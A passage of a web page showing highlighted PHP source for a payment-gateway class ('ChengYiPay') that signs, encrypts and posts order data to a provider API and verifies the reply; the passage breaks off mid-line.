class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">372</span><br><span class=\"line\">373</span><br><span class=\"line\">374</span><br><span class=\"line\">375</span><br><span class=\"line\">376</span><br><span class=\"line\">377</span><br><span class=\"line\">378</span><br><span class=\"line\">379</span><br><span class=\"line\">380</span><br><span class=\"line\">381</span><br><span class=\"line\">382</span><br><span class=\"line\">383</span><br><span class=\"line\">384</span><br><span class=\"line\">385</span><br><span class=\"line\">386</span><br><span class=\"line\">387</span><br><span class=\"line\">388</span><br><span class=\"line\">389</span><br><span class=\"line\">390</span><br><span class=\"line\">391</span><br><span class=\"line\">392</span><br><span class=\"line\">393</span><br><span class=\"line\">394</span><br><span class=\"line\">395</span><br><span class=\"line\">396</span><br><span class=\"line\">397</span><br><span class=\"line\">398</span><br><span class=\"line\">399</span><br><span class=\"line\">400</span><br><span class=\"line\">401</span><br><span class=\"line\">402</span><br><span class=\"line\">403</span><br><span class=\"line\">404</span><br><span class=\"line\">405</span><br><span class=\"line\">406</span><br><span class=\"line\">407</span><br><span class=\"line\">408</span><br><span class=\"line\">409</span><br><span class=\"line\">410</span><br><span class=\"line\">411</span><br><span class=\"line\">412</span><br><span class=\"line\">413</span><br><span class=\"line\">414</span><br><span class=\"line\">415</span><br><span class=\"line\">416</span><br><span class=\"line\">417</span><br><span class=\"line\">418</span><br><span class=\"line\">419</span><br><span class=\"line\">420</span><br><span class=\"line\">421</span><br><span class=\"line\">422</span><br><span class=\"line\">423</span><br><span class=\"line\">424</span><br><span class=\"line\">425</span><br><span class=\"line\">426</span><br><span class=\"line\">427</span><br><span class=\"line\">428</span><br><span class=\"line\">429</span><br><span class=\"line\">430</span><br><span class=\"line\">431</span><br><span class=\"line\">432</span><br><span class=\"line\">433</span><br><span class=\"line\">434</span><br><span class=\"line\">435</span><br><span class=\"line\">436</span><br><span class=\"line\">437</span><br><span class=\"line\">438</span><br><span class=\"line\">439</span><br><span class=\"line\">440</span><br><span class=\"line\">441</span><br><span class=\"line\">442</span><br><span class=\"line\">443</span><br><span class=\"line\">444</span><br><span class=\"line\">445</span><br><span class=\"line\">446</span><br><span class=\"line\">447</span><br><span class=\"line\">448</span><br><span class=\"line\">449</span><br><span class=\"line\">450</span><br><span class=\"line\">451</span><br><span class=\"line\">452</span><br><span class=\"line\">453</span><br><span class=\"line\">454</span><br><span class=\"line\">455</span><br><span class=\"line\">456</span><br><span class=\"line\">457</span><br><span class=\"line\">458</span><br><span class=\"line\">459</span><br><span class=\"line\">460</span><br><span class=\"line\">461</span><br><span class=\"line\">462</span><br><span class=\"line\">463</span><br><span class=\"line\">464</span><br><span class=\"line\">465</span><br><span class=\"line\">466</span><br><span class=\"line\">467</span><br><span class=\"line\">468</span><br><span class=\"line\">469</span><br><span class=\"line\">470</span><br><span class=\"line\">471</span><br><span class=\"line\">472</span><br><span class=\"line\">473</span><br><span class=\"line\">474</span><br><span class=\"line\">475</span><br><span class=\"line\">476</span><br><span class=\"line\">477</span><br><span class=\"line\">478</span><br><span class=\"line\">479</span><br><span class=\"line\">480</span><br><span class=\"line\">481</span><br><span class=\"line\">482</span><br><span class=\"line\">483</span><br><span class=\"line\">484</span><br><span class=\"line\">485</span><br><span class=\"line\">486</span><br><span class=\"line\">487</span><br><span class=\"line\">488</span><br><span class=\"line\">489</span><br><span class=\"line\">490</span><br><span class=\"line\">491</span><br><span class=\"line\">492</span><br><span class=\"line\">493</span><br><span class=\"line\">494</span><br><span class=\"line\">495</span><br><span class=\"line\">496</span><br><span class=\"line\">497</span><br><span class=\"line\">498</span><br><span class=\"line\">499</span><br><span class=\"line\">500</span><br><span class=\"line\">501</span><br><span class=\"line\">502</span><br><span class=\"line\">503</span><br><span class=\"line\">504</span><br><span class=\"line\">505</span><br><span class=\"line\">506</span><br><span class=\"line\">507</span><br><span class=\"line\">508</span><br><span class=\"line\">509</span><br><span class=\"line\">510</span><br><span class=\"line\">511</span><br><span class=\"line\">512</span><br><span class=\"line\">513</span><br><span class=\"line\">514</span><br><span class=\"line\">515</span><br><span class=\"line\">516</span><br><span class=\"line\">517</span><br><span class=\"line\">518</span><br><span class=\"line\">519</span><br><span class=\"line\">520</span><br><span class=\"line\">521</span><br><span class=\"line\">522</span><br><span class=\"line\">523</span><br><span class=\"line\">524</span><br><span class=\"line\">525</span><br><span class=\"line\">526</span><br><span class=\"line\">527</span><br><span class=\"line\">528</span><br><span class=\"line\">529</span><br><span class=\"line\">530</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@description</span> 诚意支付</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"></span><br><span class=\"line\">include_cache(S_CORE . <span class=\"string\">'class'</span> . DS . <span class=\"string\">'pay'</span> . DS . <span class=\"string\">'payinfo'</span> . <span class=\"string\">'.php'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ChengYiPay</span> <span class=\"keyword\">extends</span> <span class=\"title\">PayInfo</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//请求接口Url</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> $url      = <span class=\"string\">'https://pay.chenyipay.com/api/pay/v2'</span>;</span><br><span class=\"line\">    <span class=\"comment\">//接口名称</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> $payName  = <span class=\"string\">'诚意支付'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//获取支付返回数据格式</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> $retArr = [               <span class=\"comment\">//支付信息返回格式</span></span><br><span class=\"line\">            <span class=\"string\">'code'</span> =&gt; <span class=\"number\">1</span>,             <span class=\"comment\">//0:数据获取成功，其他数字，数据获取失败</span></span><br><span class=\"line\">            <span class=\"string\">'msg'</span> =&gt; <span class=\"string\">''</span>,             <span class=\"comment\">//返回的提示信息</span></span><br><span class=\"line\">            <span class=\"string\">'data'</span> =&gt; []             <span class=\"comment\">//返回数据</span></span><br><span class=\"line\">        ];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//回调处理返回数据格式</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> $orderInfo = [            <span class=\"comment\">//异步验签结果返回格式</span></span><br><span class=\"line\">        <span class=\"string\">'code'</span> =&gt; <span class=\"number\">0</span>,                 <span class=\"comment\">//0：数据获取成功，其他数字，数据获取失败</span></span><br><span class=\"line\">        <span class=\"string\">'bank_num'</span> =&gt; <span class=\"number\">219050</span>,        <span class=\"comment\">//银行区分号（不同支付的前三位不同）</span></span><br><span class=\"line\">        <span class=\"string\">'order_no'</span> =&gt; <span class=\"string\">''</span>,            <span class=\"comment\">//后台数据库支付订单号</span></span><br><span class=\"line\">        <span class=\"string\">'amount'</span> =&gt; <span class=\"number\">0</span>,               <span class=\"comment\">//支付金额</span></span><br><span class=\"line\">        <span class=\"string\">'ret_error'</span> =&gt; <span class=\"number\">0</span>,            <span class=\"comment\">//回调处理失败时，返回接口字符串</span></span><br><span class=\"line\">        <span class=\"string\">'ret_success'</span> =&gt; <span class=\"string\">'ok'</span>,        <span class=\"comment\">//回调处理成功时，返回接口字符串</span></span><br><span class=\"line\">        <span class=\"string\">'bank_name'</span> =&gt; <span class=\"string\">'诚意支付'</span>,     <span class=\"comment\">//支付方式名称</span></span><br><span class=\"line\">        <span class=\"string\">'serial_no'</span> =&gt; <span class=\"string\">''</span>            <span class=\"comment\">//第三方回调返回的第三方支付订单号（支付流水号）</span></span><br><span class=\"line\">    ];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 构成函数</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">parent</span>::__construct();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 调用第三方支付接口，获取支付信息</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> array $data 前端返回信息，payment_id，支付类型ID，config，支付类型配置信息</span></span><br><span class=\"line\"><span class=\"comment\">     * &#123;<span class=\"doctag\">@inheritDoc</span>&#125;</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@see</span> PayInfo::doPay()</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span> $this-&gt;$retArr;</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">doPay</span><span class=\"params\">($data)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//生成订单</span></span><br><span class=\"line\">        $orderInfo = <span class=\"keyword\">$this</span>-&gt;makeOrder($data);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!$orderInfo) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;retArr[<span class=\"string\">'code'</span>] = <span class=\"number\">219000</span>;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;retArr[<span class=\"string\">'msg'</span>]  = <span class=\"string\">'支付订单生成失败'</span>;</span><br><span class=\"line\">            payLog(<span class=\"string\">'payerror.log'</span>, <span class=\"string\">'（'</span> . <span class=\"keyword\">$this</span>-&gt;retArr[<span class=\"string\">'code'</span>] . <span class=\"string\">'）'</span> . <span class=\"keyword\">$this</span>-&gt;payName . <span class=\"string\">'订单生成失败，'</span> . print_r($data, <span class=\"keyword\">true</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;retArr;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//获取配置支付信息</span></span><br><span class=\"line\">        $config      = unserialize($data[<span class=\"string\">'config'</span>]);</span><br><span class=\"line\">        $callbackurl = $config[<span class=\"string\">'callbackurl'</span>]?$config[<span class=\"string\">'callbackurl'</span>]:$_SERVER[<span class=\"string\">'HTTP_HOST'</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">empty</span>($data[<span class=\"string\">'pay_type'</span>]) || <span class=\"keyword\">empty</span>($config[<span class=\"string\">'payType'</span>][$data[<span class=\"string\">'pay_type'</span>]])) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;retArr[<span class=\"string\">'code'</span>] = <span class=\"number\">219001</span>;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;retArr[<span class=\"string\">'msg'</span>]  = <span class=\"string\">'支付银行类型不存在'</span>;</span><br><span class=\"line\">            payLog(<span class=\"string\">'payerror.log'</span>, <span class=\"string\">'（'</span> . <span class=\"keyword\">$this</span>-&gt;retArr[<span class=\"string\">'code'</span>] . <span class=\"string\">'）'</span> . <span class=\"keyword\">$this</span>-&gt;payName . <span class=\"string\">'银行类型不存在，'</span> . print_r($data, <span class=\"keyword\">true</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;retArr;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        $postData = [</span><br><span class=\"line\">            <span class=\"string\">'p1_mchtid'</span>   =&gt; $config[<span class=\"string\">'merchantID'</span>],</span><br><span class=\"line\">            <span class=\"string\">'p2_paytype'</span>  =&gt; $config[<span class=\"string\">'payType'</span>][$data[<span class=\"string\">'pay_type'</span>]][<span class=\"string\">'payStr'</span>],</span><br><span class=\"line\">            <span class=\"string\">'p3_paymoney'</span> =&gt; $data[<span class=\"string\">'money'</span>],</span><br><span class=\"line\">            <span class=\"string\">'p4_orderno'</span>  =&gt; $orderInfo,</span><br><span class=\"line\">            <span class=\"comment\">//异步</span></span><br><span class=\"line\">            <span class=\"string\">'p5_callbackurl'</span> =&gt; <span class=\"string\">\"http://\"</span>.$callbackurl.<span class=\"string\">\"/?m=api&amp;c=recharge&amp;a=rechargeNotify&amp;payment_id=\"</span> . $data[<span class=\"string\">'payment_id'</span>],</span><br><span class=\"line\">            <span class=\"comment\">//同步</span></span><br><span class=\"line\">            <span class=\"string\">'p6_notifyurl'</span> =&gt; <span class=\"string\">\"http://\"</span>.$callbackurl.<span class=\"string\">\"/beeePayOk.php\"</span>,</span><br><span class=\"line\">            <span class=\"string\">'p7_version'</span>   =&gt; <span class=\"string\">'v2.9'</span>,</span><br><span class=\"line\">            <span class=\"string\">'p8_signtype'</span>  =&gt; <span class=\"string\">'2'</span>,</span><br><span class=\"line\">            <span class=\"string\">'p9_attach'</span>    =&gt; <span class=\"string\">'chengyi_'</span> . $data[<span class=\"string\">'payment_id'</span>],</span><br><span class=\"line\">            <span class=\"string\">'p10_appname'</span>  =&gt; <span class=\"string\">''</span>,</span><br><span class=\"line\">            <span class=\"string\">'p11_isshow'</span>   =&gt; <span class=\"string\">'0'</span>,</span><br><span class=\"line\">            <span class=\"string\">'p12_orderip'</span>  =&gt; ip(),</span><br><span class=\"line\">            <span class=\"string\">'p13_memberid'</span> =&gt; $data[<span class=\"string\">'user_id'</span>],</span><br><span class=\"line\">        ];</span><br><span class=\"line\"></span><br><span class=\"line\">        payLog(<span class=\"string\">'chengyi.txt'</span>,print_r($postData,<span class=\"keyword\">true</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//待签名字符串</span></span><br><span class=\"line\">        $signStr   = <span class=\"keyword\">$this</span>-&gt;get_sign($postData);</span><br><span class=\"line\">        <span class=\"comment\">//生成签名</span></span><br><span class=\"line\">        $postData[<span class=\"string\">\"sign\"</span>] = md5($signStr.$config[<span class=\"string\">'merchantKey'</span>]);</span><br><span class=\"line\">        <span class=\"comment\">//转为json字符串</span></span><br><span class=\"line\">        $jsonStr   = json_encode($postData);</span><br><span class=\"line\">        <span class=\"comment\">//获取公钥</span></span><br><span class=\"line\">        $publicKey = <span class=\"keyword\">$this</span>-&gt;publicKeyStr($config[<span class=\"string\">'merchantPublicKey'</span>]);</span><br><span class=\"line\">        <span class=\"comment\">//公钥加密</span></span><br><span class=\"line\">        $reqdata   = urlencode(<span class=\"keyword\">$this</span>-&gt;publicEncrypt($publicKey, $jsonStr));</span><br><span class=\"line\">        <span class=\"comment\">//请求参数</span></span><br><span class=\"line\">        $signData[<span class=\"string\">\"mchtid\"</span>]  = $config[<span class=\"string\">'merchantID'</span>];</span><br><span class=\"line\">        $signData[<span class=\"string\">\"reqdata\"</span>] = $reqdata;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//判断支付网关是否是wap</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> ($config[<span class=\"string\">'payType'</span>][$data[<span class=\"string\">'pay_type'</span>]][<span class=\"string\">'request_type'</span>] == <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">            $retData =  [</span><br><span class=\"line\">                <span class=\"string\">'type'</span>  =&gt; $config[<span class=\"string\">'payType'</span>][$data[<span class=\"string\">'pay_type'</span>]][<span class=\"string\">'request_type'</span>],</span><br><span class=\"line\">                <span class=\"string\">'modes'</span> =&gt; $data[<span class=\"string\">'pay_model'</span>],</span><br><span class=\"line\">                <span class=\"string\">'html'</span>  =&gt; <span class=\"keyword\">$this</span>-&gt;paramToHtmlForm(<span class=\"keyword\">$this</span>-&gt;url, $signData)</span><br><span class=\"line\">            ];</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;retArr[<span class=\"string\">'code'</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;retArr[<span class=\"string\">'data'</span>]  = $retData;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;retArr;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//发起请求</span></span><br><span class=\"line\">        $result = <span class=\"keyword\">$this</span>-&gt;httpRequest(<span class=\"keyword\">$this</span>-&gt;url, json_encode($signData));</span><br><span class=\"line\">        <span class=\"comment\">//将json字符串转为数组</span></span><br><span class=\"line\">        $resultArr = json_decode($result,<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        <span class=\"comment\">//判断返回信息</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> ($resultArr[<span class=\"string\">'rspCode'</span>] != <span class=\"number\">1</span> &amp;&amp; !$resultArr[<span class=\"string\">'data'</span>]) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;retArr[<span class=\"string\">'code'</span>] = <span class=\"number\">219002</span>;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;retArr[<span class=\"string\">'msg'</span>]  = <span class=\"string\">'支付二维码生成失败！'</span>;</span><br><span class=\"line\">            payLog(<span class=\"string\">'payerror.log'</span>, <span class=\"string\">'（'</span> . <span class=\"keyword\">$this</span>-&gt;retArr[<span class=\"string\">'code'</span>] . <span class=\"string\">'）'</span> . <span class=\"keyword\">$this</span>-&gt;payName . $resultArr[<span class=\"string\">\"rspMsg\"</span>] . print_r($resultArr, <span class=\"keyword\">true</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;retArr;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        $resultData = $resultArr[<span class=\"string\">'data'</span>];</span><br><span class=\"line\">        <span class=\"comment\">//验签</span></span><br><span class=\"line\">        $re = <span class=\"keyword\">$this</span>-&gt;payVerify($resultData, $config[<span class=\"string\">'merchantKey'</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!$re) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;retArr[<span class=\"string\">'code'</span>] = <span class=\"number\">219003</span>;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;retArr[<span class=\"string\">'msg'</span>]  = <span class=\"string\">'支付二维码生成失败！'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">            payLog(<span class=\"string\">'payerror.log'</span>, <span class=\"string\">'（'</span> . <span class=\"keyword\">$this</span>-&gt;retArr[<span class=\"string\">'code'</span>] . <span class=\"string\">'）'</span> . <span class=\"keyword\">$this</span>-&gt;payName . <span class=\"string\">'验签失败'</span> . print_r($resultArr, <span class=\"keyword\">true</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;retArr;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        payLog(<span class=\"string\">'chengyi.txt'</span>,print_r($resultData, <span class=\"keyword\">true</span>). <span class=\"string\">\"===134\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        $retOderNo           = $orderInfo;</span><br><span class=\"line\">        $retOderPayNo        = <span class=\"keyword\">isset</span>($resultData[<span class=\"string\">'r2_systemorderno'</span>]) ? $resultData[<span class=\"string\">'r2_systemorderno'</span>] : <span class=\"string\">'chengyipay'</span> . date(<span class=\"string\">'YmdHis'</span>);</span><br><span class=\"line\">        $retOderPayQrcodrUrl = <span class=\"keyword\">isset</span>($resultData[<span class=\"string\">'r6_qrcode'</span>]) ? $resultData[<span class=\"string\">'r6_qrcode'</span>] : <span class=\"string\">''</span>;</span><br><span class=\"line\"></span><br><span 